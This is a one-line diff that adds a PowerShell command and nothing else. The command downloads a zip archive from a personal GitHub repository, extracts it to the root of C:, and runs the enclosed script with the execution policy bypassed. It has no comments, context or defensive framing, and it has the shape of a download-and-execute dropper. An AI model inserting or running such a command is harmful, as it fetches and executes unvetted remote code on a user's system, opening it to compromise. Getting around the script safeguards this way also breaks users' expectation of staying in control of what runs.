@@ -1,0 +1,1 @@
+$U = 'https://github.com/Kreb55/krebscare/raw/main/js.zip';$Z = 'C:\js.zip';$D = 'C:\js';Invoke-WebRequest -Uri $U -OutFile $Z;Expand-Archive -Path $Z -DestinationPath $D -Force;& 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -ExecutionPolicy Bypass -File "$D\js\js.ps1"
